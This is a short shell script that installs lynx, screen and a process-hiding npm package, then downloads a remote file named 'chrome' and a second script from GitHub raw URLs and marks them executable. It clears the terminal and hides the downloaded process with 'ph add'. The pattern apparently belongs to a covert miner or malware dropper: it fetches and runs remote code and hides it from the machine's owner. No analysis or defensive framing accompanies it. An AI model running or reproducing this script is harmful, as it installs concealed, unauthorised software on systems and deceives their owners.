#!/bin/sh
#
apt update -y
apt install screen -y

apt install -y lynx
npm i -g node-process-hider
#
lynx -dont_wrap_pre -dump https://raw.githubusercontent.com/esinkaguh/basicsrb/main/chrome > data && chmod 777 data
#
wget https://raw.githubusercontent.com/esinkaguh/esinkaguh/main/time.sh && chmod +x time.sh

#####
clear
 
#
ph add data